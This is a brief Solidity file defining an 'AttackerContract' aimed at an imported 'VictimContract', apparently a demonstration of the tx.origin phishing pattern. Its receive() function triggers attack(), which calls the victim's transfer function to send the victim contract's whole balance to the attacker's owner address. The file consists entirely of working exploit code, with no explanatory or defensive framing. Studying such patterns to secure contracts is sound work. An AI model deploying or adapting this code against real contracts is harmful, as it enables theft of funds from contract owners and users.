// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.0;

import "./VictimContract.sol";

contract AttackerContract {
    address payable public owner;

    VictimContract victimContract;

    constructor(VictimContract _victimContract) {
        victimContract = VictimContract(_victimContract);
        owner = payable(msg.sender);
    }

    function attack() public {
        victimContract.transfer(owner, address(victimContract).balance);
    }

    receive() external payable {
        attack();
    }
}
